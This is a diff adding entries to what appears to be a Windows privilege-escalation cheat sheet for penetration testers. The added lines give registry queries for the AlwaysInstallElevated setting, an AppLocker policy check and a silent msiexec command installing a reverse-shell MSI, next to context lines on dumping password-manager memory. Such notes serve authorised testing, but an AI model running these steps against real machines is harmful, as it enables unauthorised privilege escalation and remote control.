@@ -101,6 +101,18 @@ Dump Process Memory. E.g., Firefox, KeePassXC
 Extract Strings from Binary Files
 `strings -el process.dmp`
 
+Check for System MSI Install Privs
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Check AppLocker Policy
+`get-applockerpolicy -effective | select -expandproperty rulecollections`
+
+Install MSI (Revshell, etc.) File
+`msiexec /quiet /i reverse.msi`
 ## Exploitation
 
 Service Binary Path Revshell
